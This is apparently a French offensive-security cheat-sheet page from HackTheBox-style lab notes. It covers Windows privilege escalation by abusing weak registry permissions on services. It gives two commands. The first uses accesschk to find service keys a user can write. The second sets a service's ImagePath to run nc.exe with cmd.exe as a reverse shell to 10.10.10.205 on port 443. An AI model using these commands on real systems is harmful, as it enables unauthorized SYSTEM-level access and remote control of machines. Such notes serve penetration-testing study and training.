# Permissive Registry ACLs

### <mark style="color:red;">Permissive Registry ACLs</mark>

#### <mark style="color:green;">Vérification des ACLs de service faibles dans le registre</mark>

{% code fullWidth="true" %}
```
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```
{% endcode %}

#### <mark style="color:green;">Modification du ImagePath avec PowerShell</mark>

{% code fullWidth="true" %}
```
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
{% endcode %}
